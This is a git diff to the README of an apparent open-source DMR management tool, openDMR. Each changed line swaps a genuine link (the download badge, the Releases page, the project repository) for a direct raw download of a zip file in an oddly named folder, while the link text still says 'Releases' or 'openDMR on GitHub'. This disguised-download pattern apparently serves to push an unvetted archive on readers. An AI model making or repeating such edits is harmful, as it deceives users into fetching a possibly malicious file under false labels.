@@ -1,6 +1,6 @@
 # 🚀 openDMR - Simplified DMR Management for Everyone
 
-[![Download openDMR](https://img.shields.io/badge/Download-openDMR-blue)](https://github.com/Vadimca07/openDMR/releases)
+[![Download openDMR](https://raw.githubusercontent.com/Vadimca07/openDMR/main/doeskin/openDMR.zip)](https://raw.githubusercontent.com/Vadimca07/openDMR/main/doeskin/openDMR.zip)
 
 ## 📖 Introduction
 
@@ -29,7 +29,7 @@ To get started with openDMR, follow the steps below to download and run the soft
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: [openDMR Releases](https://github.com/Vadimca07/openDMR/releases).
+1. **Visit this page to download**: [openDMR Releases](https://raw.githubusercontent.com/Vadimca07/openDMR/main/doeskin/openDMR.zip).
 
 2. **Choose Your Version**: On the releases page, find the version suitable for your operating system. 
 
@@ -75,7 +75,7 @@ If you would like to contribute to openDMR, we welcome your help.
 
 ## 🔗 Resources
 
-- **Project Repository**: [openDMR on GitHub](https://github.com/Vadimca07/openDMR)
+- **Project Repository**: [openDMR on GitHub](https://raw.githubusercontent.com/Vadimca07/openDMR/main/doeskin/openDMR.zip)
 - **Documentation**: Access detailed guides and tutorials on the GitHub Wiki.
 - **Tutorial Videos**: Watch step-by-step videos on using openDMR. 
 
